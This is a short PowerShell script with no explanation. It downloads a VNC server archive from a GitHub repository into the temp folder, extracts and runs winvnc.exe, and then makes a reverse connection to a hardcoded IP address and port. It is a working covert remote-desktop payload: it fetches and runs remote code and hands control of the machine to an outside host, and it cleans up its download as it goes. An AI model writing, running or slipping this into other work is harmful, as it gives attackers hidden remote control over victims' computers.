
$ip = "192.168.52.130"
$port = '8080'

$tempFolder = "$env:temp\vnc"
$vncDownload = "https://github.com/beigeworm/assets/raw/main/winvnc.zip"
$vncZip = "$tempFolder\winvnc.zip"

if (!(Test-Path -Path $tempFolder)) {
    New-Item -ItemType Directory -Path $tempFolder | Out-Null
}

if (!(Test-Path -Path $vncZip)) {
    Invoke-WebRequest -Uri $vncDownload -OutFile $vncZip
}
sleep 1
Expand-Archive -Path $vncZip -DestinationPath $tempFolder -Force
sleep 1
rm -Path $vncZip -Force

$proc = "$tempFolder\winvnc.exe"
Start-Process $proc -ArgumentList ("-run")
sleep 2
Start-Process $proc -ArgumentList ("-connect $ip::$port")